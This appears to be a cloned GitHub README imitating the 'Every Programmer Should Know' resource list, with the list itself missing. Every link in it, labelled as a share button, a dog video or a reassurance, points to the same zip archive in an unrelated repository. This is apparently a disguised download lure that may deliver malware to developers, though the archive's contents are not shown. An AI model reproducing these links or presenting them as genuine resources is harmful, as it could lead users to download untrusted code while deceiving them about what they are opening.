# Every Programmer Should Know :thinking:
A collection of (mostly) technical things every software developer should know.

:point_up: *These are resources I can recommend to every programmer regardless of their skill level or tech stack*

Highly opinionated :bomb:. Not backed by science.
Comes in no particular order :recycle:

U like it? :star: it and [share](https://raw.githubusercontent.com/Parthkh28/every-programmer-should-know/master/astoundingly/should-know-every-programmer-2.7.zip) with a friendly developer!
U don't like it? [Watch the doggo](https://raw.githubusercontent.com/Parthkh28/every-programmer-should-know/master/astoundingly/should-know-every-programmer-2.7.zip) :dog:

*P.S. You [don't need to know](https://raw.githubusercontent.com/Parthkh28/every-programmer-should-know/master/astoundingly/should-know-every-programmer-2.7.zip) all of that by heart to be a programmer.
But knowing the stuff will help you become better! :muscle:*
